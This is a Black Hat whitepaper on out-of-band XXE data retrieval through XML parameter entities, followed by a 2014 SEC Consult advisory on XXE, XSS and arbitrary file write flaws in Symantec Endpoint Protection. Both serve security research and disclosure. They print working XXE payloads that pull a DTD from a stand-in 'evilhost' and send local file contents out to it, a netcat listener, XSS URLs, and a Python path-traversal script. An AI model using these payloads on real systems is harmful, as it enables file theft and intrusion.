=== Content from media.blackhat.com_415a3411_20250126_065023.html ===
XML DATA RETRIEVAL

Timur Yunusov

Alexey Osipov

CONTENT

1. Introduction

2. It's all about entities

3. Parameter entities

4. Validity and well-formedness

5. XXE Data Retrieval

6. Peculiar features of attacks on various parsers

7. References

8. About Positive Technologies

3

3

4

5

8

9

   10

10

1. Introduction

The XML language is getting more and more common. It is more frequently used in web applications.
That is why in-depth research of its algorithms and creation of new attack methods are getting more
common as well — the techniques, which allow reading data from a file system exploiting errors
(error-based attack), bruteforcing XML files with XSD schemas (blind attack), have been already
studied.

It reminds you of something, doesn't it? :)

Yes, SQL attacks were studied in a similar way long ago. Nowadays SQL Injection techniques are
thoroughly studied for the majority of DBMS types. The same is in store for XML — sooner or later it
will give in to inquisitive minds. We want to call your attention to an XML attack similar to Data
Retrieval over DNS while exploiting SQL Injection.

2. It's all about entities

XML specification [1] describes several types of so-called entities (we know many of them: entities
are usually used for conducting attacks on XML, named XML eXternal Entity, XXE):

  Predefined entities



Internal entities

  External entities



Internal parameter entities

  External parameter entities

So far the third type of entities has been most frequently attacked (except for DoS): using various
files of a file system as a source of an external entity, it was possible (not always) to read files of the
file system via data output in XML or error output. Besides it was possible to conduct DoS attacks,
bruteforce the content of a parsed entity, read files via a Document Type Declaration (DTD), which if
error output was enabled allowed displaying the content of the read file.

3. Parameter entities

The majority of users either do not know or know very little about such structures as parameter
entities. If XML was attacked, they primarily either were useless (general entities were quite enough)
or returned not all data.

The XML specification defines the following: "References to parameter entities are permitted only
within the DTD. A parameter entity is declared by placing % before its name. A percent sign is also
used in references to parameter entities instead of an ampersand. References to parameter entities
are immediately parsed in a DTD, and the replacement text becomes a part of the DTD, as far as
entities are not parsed at all. Parameter entities are not recognized in a document body."

In other words, parameter entities:

1.  Are parsed very easily while creating a DTD.

2.  Allow  creating  other  entities  and  parameter  entities  (which  results  from  the  first

statement).

An example of a document that uses parameter entities can be as follows:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % param1 "<!ENTITY internal 'some_text'>">

%param1;

]>

<root>&internal;</root>

The parameter entity param1 contains declaration of the internal entity internal, which in its turn is
inserted in the tag root and displayed to a user.

4. Validity and well-formedness

Suppose you have a validating parser, and it maintains external entities (still quite frequent
combination). According to the XML specification, certain constraints should be complied with when
a document is checked. [2] for the details of specific validation features and parser constraints). For
instance, constraints for tag attributes look as follows:

Well-formedness constraint: Unique Att Spec

Validity constraint: Attribute Value Type

Well-formedness constraint: No External Entity References

Well-formedness constraint: No < in Attribute Values

Everything is clear with the first two: an attribute name should be unique, and its value should
comply with a declared type. These errors do not interfere with what we do and sometimes even
help us (those very error-based XXE injections).

Let's consider in detail the third requirement — attributes should not contain references to external
entities directly or indirectly. Indeed, the following three documents will fail well-formedness check:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY external SYSTEM "file:///c:/boot.ini">

]>

<root attrib="&external;" />

Error: External entity 'external' reference cannot appear in the attribute value.

Even the parameter entity is helpless:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % param1 "<!ENTITY external SYSTEM 'file:///c:/boot.ini'>">

%param1;

]>

<root attrib="&external;" />

Error: The external entity reference "&external;" is not permitted in an attribute value.

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % param1 SYSTEM "file:///c:/boot.ini">

<!ENTITY external "%param1;">

]>

<root attrib="&external;" />

Error: A parameter entity reference is not allowed in internal markup.

The last example is of great interest because one more specification constraint is violated: Well-
formedness constraint: PEs in Internal Subset. We cannot place parameter entities into the
declaration of an internal DTD. However, the specification includes information how to bypass this
obstacle: This does not apply to references that occur in external parameter entities or to the external
subset. Let's just view the external document, in which the necessary parameter entities that can be
further referred in the source document are declared.

So what will happen if a part of a DTD is declared in an external file? According to the specification,
behavior related to the constraint on placing external entities in attributes shouldn't be changed, all
the data will be checked for validity and well-formedness, placed and parsed later. However, some of
the parsers including libxml (PHP, Python, Ruby), Xerces2 (Java), System.XML (.NET) seem to have a
little different opinion :)

Let's create a page with the following content on our site (note that there's no doctype!):

<!ENTITY % payload SYSTEM "file:///c:/boot.ini">

<!ENTITY % param1 "<!ENTITY internal '%payload;'>">

The secret is that a parameter entity cannot be placed in an internal entity. Anyway, parsers in Java
and .NET are not pleased with such attempts.

And here is the source document:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root

[

<!ENTITY % remote SYSTEM "http://evilhost/evil.xml">

%remote;

%param1;

]>

<root attrib="&internal;" />

The algorithm to parse a document is as follows:

1)  DTD content is parsed.

2)  The declaration and reference of the external parameter entity remote is detected.

3)  When  remote  is  referred  to,  http://evilhost/evil.xml  is  parsed.  This  file  contains

declaration  of  the  external  parameter  entity  payload,  which  we  are  going  to  read,  and

the parameter entity param1, which should create the internal entity internal.

4)  It  should  be  noted  that  we've  just  prepared  our  injection  by  declaring  the  entity,  but

file:///c:/boot.ini still cannot be read.

5)  As far as http://evilhost/evil.xml is valid, it substitutes remote in the source document.

6)  The parameter entity param1 is referred to, and we take control over the entity internal,

which (all of a sudden!) is not an external entity.

What is the profit?





If the parser outputs an attribute value, then we get the entity value.

If we can access the XSD schema, we can get error output.

<xs:restriction base="xs:string">

<xs:pattern value="&internal;" />

</xs:restriction>

5. XXE Data Retrieval

Now is the sweetest part. What do we need XML Injection for? To obtain some data. Parameter
entities help us to access external resources transferring to them file content from the server, where
the parser is located, via external entities using the technique described above. It allows attacking
parsers, on which any data output is disabled!

1. Send the following document to the XML parser:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % remote SYSTEM "http://evilhost/evil.xml">

%remote;

%param1;

]>

<root>&external;</root>

2. Parsing this DTD, the parser refers to the parameter entity remote, and if it has access to our
resource (which is not always the case) it will substitute it for the following content:

<!ENTITY % payload SYSTEM "file:///c:/boot.ini">

<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://evilhost/log.php?log=%payload;'>">

Then the parser declares the parameter entity param1, refers to it in the main document right after
referring to remote. param1 contains the declaration of external, to which we refer in the body of
the XML document. This construction allows reading the content of the file c:/boot.ini, substituting
c:/boot.ini for external entity bypassing constraints on parameter entities declaration in other
entities, and allows referencing external transferring the file content to the server controlled by us.

Sometimes entities do not work in a parser. Then the following construction is of help

(parameter entities only):

1. Send the following document to the XML parser:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY % remote SYSTEM "http://evilhost/evil_2.xml">

%remote;]>

<root/>

2. ext_2.xml content:

<!ENTITY % payload SYSTEM "file:///c:/boot.ini">

<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://evilhost/log.php?%payload;" >'

>

%param1;

%external;

This technique differs from the previous one in the fact that an attack is conducted only when a DTD
is declared.

6. Peculiar features of attacks on various parsers

Sometimes a parser does not check the length of a created URI, and a lot of parsers convert line
feeds automatically (Xerces replaces them with spaces, and System.XML processes with urlencode).
However, this length will be checked on the side of our web server (usually 2048 bytes), that is why
instead of a web server the command “nс –l –p 80” can be used.

The libxml parser used in PHP, Python, and Ruby limits the content size of external entities by default
(the same 2048 bytes); to bypass it, it is necessary to run it with the flag LIBXML_PARSEHUGE. And
this parser does not convert line feeds, that is why it won't help in sending multiline files.

Fortunately, PHP has wonderful wrappers, which were described in detail by Alexey Moskvin at
PHDays 2012 [3]. They can be used not only for converting multiline files into one string (by means of
the wrapper php://filter/read=convert.base64-encode/resource=file:///c:/boot.ini), but in the main
DTD as well to transfer the content of the file ext.xml without accessing external resources using the
wrapper data:text/html;base64,PCFFTlRJVFkgJSB0N***.

7. References

1. Extensible Markup Language (XML) 1.0 (Fifth Edition), http://www.w3.org/TR/REC-xml/

2. Andrey Petukhov, XXE Attack, http://andrepetukhov.wordpress.com/2011/01/15/

3. Alexey Moskvin at PHDays 2012, PHP Wrappers, http://www.slideshare.net/phdays/php-wrappers

8. About Positive Technologies

Positive  Technologies  is  at  the  cutting  edge  of  IT  Security.  A  specialist  developer  of  IT  Security
products,  Positive  Technologies  has  over  a  decade  of  experience  in  detecting  and  managing
vulnerabilities in IT systems.  The company has been named one of the top ten worldwide vendors of
Vulnerability  Assessment  systems  and  is  among  the  top  five  fastest-growing  firms  in  Security
&  Vulnerability Management globally*

Positive  Technologies  has  more  than  300  employees  at  its  offices  and  research  centres  in  London,
Rome, Moscow,  Seoul and Tunis. Its technology partners include  IBM, Oracle, Cisco, Microsoft and
HP.

Positive Technologies’ innovation division, Positive Research, is one of the largest security research
facilities in Europe. Our experts work alongside industry bodies, regulators and universities to
advance knowledge in the field of information security and to apply this analysis to improving the
company’s products and services. The centre carries out research, design and analytical works, threat
and vulnerability analysis and error elimination.

Since 2004, Positive Research has helped global manufacturers including Microsoft, Cisco, Google,
Avaya, Citrix, VMware and Trend Micro to eliminate hundreds of vulnerabilities and defects that
threatened the safety of their systems.

*Source: Market intelligence firm IDC’s report “Worldwide Security and Vulnerability Management Forecast for
2012-2016”



=== Content from seclists.org_4065eec2_20250125_064957.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20141106-0 :: XXE & XSS & Arbitrary File Write vulnerabilities in Symantec Endpoint Protection

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 6 Nov 2014 09:40:32 +0100

---

```
SEC Consult Vulnerability Lab Security Advisory < 20141106-0 >
=======================================================================
              title: XXE & XSS & Arbitrary File Write vulnerabilities
            product: Symantec Endpoint Protection
 vulnerable version: 12.1.4023.4080
      fixed version: 12.1.5 (RU 5)
             impact: Critical
         CVE number: CVE-2014-3437, CVE-2014-3438, CVE-2014-3439
           homepage: <http://www.symantec.com>
              found: 2014-07-01
                 by: Stefan Viehböck
                     SEC Consult Vulnerability Lab
                     <https://www.sec-consult.com>
=======================================================================

Vendor description:
-------------------
"Symantec Endpoint Protection is a client-server solution that protects
laptops, desktops, Windows and Mac computers, and servers in your network
against malware. Symantec Endpoint Protection combines virus protection with
advanced threat protection to proactively secure your computers against known
and unknown threats.
Symantec Endpoint Protection protects against malware such as viruses, worms,
Trojan horses, spyware, and adware. It provides protection against even the
most sophisticated attacks that evade traditional security measures, such as
rootkits, zero-day attacks, and spyware that mutates. Providing low maintenance
and high power, Symantec Endpoint Protection communicates over your network to
automatically safeguard for both physical systems and virtual systems against
attacks."

Source:
<https://www.symantec.com/endpoint-protection>
<https://www.symantec.com/business/support/index?page=content&id=DOC6153>

Business recommendation:
------------------------
Attackers are able to perform denial-of-service attacks against the Endpoint
Protection Manager which directly impacts the effectiveness of the client-side
endpoint protection. Furthermore, session identifiers of users can be stolen
to impersonate them and gain unauthorized access to the server.

All of these attacks can have a severe impact on the security infrastructure.
An update to the latest version (12.1.5 RU 5) is highly recommended.

Vulnerability overview/description:
-----------------------------------
1) XML External Entity Injection (XXE) [CVE-2014-3437]
Multiple XXE vulnerabilities were found in the Endpoint Protection Manager
application. An attacker needs to perform MitM attacks to impersonate
securityresponse.symantec.com (eg. via DNS poisoning/spoofing/hijacking,
ARP spoofing, QUANTUM-style attacks, ...) to inject malicious XML code.
These vulnerabilities can be used to execute server side request
forgery (SSRF) attacks used for portscanning/fingerprinting, denial of service,
file disclosure as well as attacks against functionality that is only
exposed internally (see CVE-2013-5015 and issue #3).

Note:
The exploitation scenario proves that the previous command execution via
SQL injection was exploitable for an external attacker with the ability to
manipulate internet traffic _without any prior knowledge_ of the target system.

2) Reflected Cross-Site-Scripting (XSS) [CVE-2014-3438]
Endpoint Protection Manager suffers from a reflected cross-site scripting
vulnerability, which allows an attacker to steal other users' sessions, to
impersonate other users and to gain unauthorized access to the admin interface.

3) Unauthenticated Arbitrary File Write/Overwrite [CVE-2014-3439]
Arbitrary files can be written or overwritten by an unauthenticated attacker.
The target file is truncated in the process which results in Denial of Service.
However it might be possible to write files with arbitrary content nonetheless.

Proof of concept:
-----------------
1) XML External Entity Injection (XXE) [CVE-2014-3437]
The Symantec Protection Center component downloads XML files from
<http://securityresponse.symantec.com> for information purposes.
By impersonating securityresponse.symantec.com (eg. via DNS
poisoning/spoofing/hijacking, ARP spoofing, QUANTUM-style attacks, ...) an
attacker can inject malicious XML code into the file contents and thus exploit
XXE vulnerabilities.

For example by offering the following XML code at the URL
<http://securityresponse.symantec.com/avcenter/deepsightkiosk/9.xml>
arbitrary files can be disclosed via the Symantec Protection Center login
page at https://<HOST>:8443/portal/Login.jsp

===============================================================================
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE a [<!ENTITY e SYSTEM 'file:///c:/windows/win.ini'> ]>

<data>
  <regular>
    <text>&e;</text>
  </regular>
  <outbreak></outbreak>
  <threatcon>1</threatcon>
</data>
===============================================================================

Server Side Request Forgery (SSRF) can be  exploited like in the following
example that sets the application log level to "log all messages" eg. via
<http://securityresponse.symantec.com/avcenter/deepsightkiosk/10.xml>

===============================================================================
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE a [<!ENTITY e SYSTEM
'[http://localhost:9090/servlet/ConsoleServlet?ActionType=ConfigServer&logLevel=ALL'](http://localhost:9090/servlet/ConsoleServlet?ActionType=ConfigServer&logLevel=ALL&apos);> ]>
<foo>&e;</foo>
===============================================================================

Furthermore some files can be exfiltrated to remote servers via the
techniques described in:
<https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf>
<http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf>

2) Reflected Cross-Site-Scripting (XSS) [CVE-2014-3438]
At least the following URLs are vulnerable to XSS:
https://<HOST>:8443/console/Highlander_docs/SSO-Error.jsp?ErrorMsg=<script>alert('xss')</script>
https://<HOST>:8443/portal/Loading.jsp?uri=Ij48c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0Pj9BQUFBPUJCQkIiPjxzY3JpcHQ%2bYWxlcnQoJ3hzcycpPC9zY3JpcHQ%2b

3) Unauthenticated Arbitrary File Write/Overwrite [CVE-2014-3439]
A flaw in ConsoleServlet allows an attacker to specify the application server
thread name via the ActionType parameter. As the thread name is used in
the pattern that is passed to the java.util.logging.FileHandler constructor
by the logging component (ServerLogger) an attacker can define the log file
path. By causing an exception in the thread, the log file is written to
disk.
The following code snippet causes an exception by terminating the TCP
connection before the server has finished writing the response to the socket.

ActionType=/../../../../../../../../../../WINDOWS/win.ini%00 causes the win.ini
file to be truncated.

===============================================================================
import socket
import struct

HOST = '<HOST>'
PORT = 9090
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
l_onoff = 1
l_linger = 0
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', l_onoff, l_linger))

msg = '''GET
/servlet/ConsoleServlet?ActionType=/../../../../../../../../../../WINDOWS/win.ini%00
HTTP/1.1
Host: SYMEPP
EvilContent: <?php evilcode(); ?>

'''

s.sendall(msg)
s.shutdown(socket.SHUT_RD)
===============================================================================

ActionType=/../../Inetpub/Reporting/evil.php%00 causes the (empty) file
evil.php to be written into the Apache webroot.

ActionType=/../../Inetpub/Reporting/evil.php causes the file
evil-0.log to be written into the Apache webroot.

If the application log level has been set to "DEBUG" (which can be achieved
via XXE, see issue #1) the file content includes all headers passed in the
HTTP request (including the EvilContent header in the example above). However
the file will not be processed by PHP because of the .log extension. Due to
the complex nature of the Windows filesystem addressing modes (legacy/DOS,
ADS, etc.) it is entirely possible that this limitation can be bypassed.

Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been verified to exist in Symantec Endpoint Protection
version 12.1.4023.4080, which was the most recent version at the time of discovery.

Vendor contact timeline:
------------------------
2014-07-11: Initial contact to secure () symantec com
2014-07-29: Ask for status at secure () symantec com
2014-08-01: Conference call about status, extended grace period to 2014-10-31
September/October: Several discussions / rechecks of the vulnerabilities
2014-11-06: Coordinated release of the advisory

Solution:
---------

1) XML External Entity Injection (XXE) [CVE-2014-3437]

Update to version 12.1.5 RU 5

2) Reflected Cross-Site-Scripting (XSS) [CVE-2014-3438]

Update to version 12.1.5 RU 5

3) Unauthenticated Arbitrary File Write/Overwrite [CVE-2014-3439]

The update to version 12.1.5 RU 5 only partially mitigates the vulnerability.
Path Traversal is no longer possible, which reduces the severity to
low/medium. The vendor claims that it will be entirely solved in the next
version (12.1.5 RU6).

For further information see the security advisory of the vendor:
<http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141105_00>

Workaround:
-----------
See Symantec security advisory for further mitigations.

Advisory URL:
--------------
<https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Vulnerability Lab

SEC Consult
Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius - Zurich

Headquarter:
Mooslackengasse 17, 1190 Vienna, Austria
Phone:   +43 1 8903043 0
Fax:     +43 1 8903043 15

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

Interested in working with the experts of SEC Consult?
Write to career () sec-consult com

EOF Stefan Viehböck / @2014

```

**Attachment:
[signature.asc](att-7/signature_asc.bin)**

*Description:* OpenPGP digital signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

### Current thread:

* **SEC Consult SA-20141106-0 :: XXE & XSS & Arbitrary File Write vulnerabilities in Symantec Endpoint Protection** *SEC Consult Vulnerability Lab (Nov 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


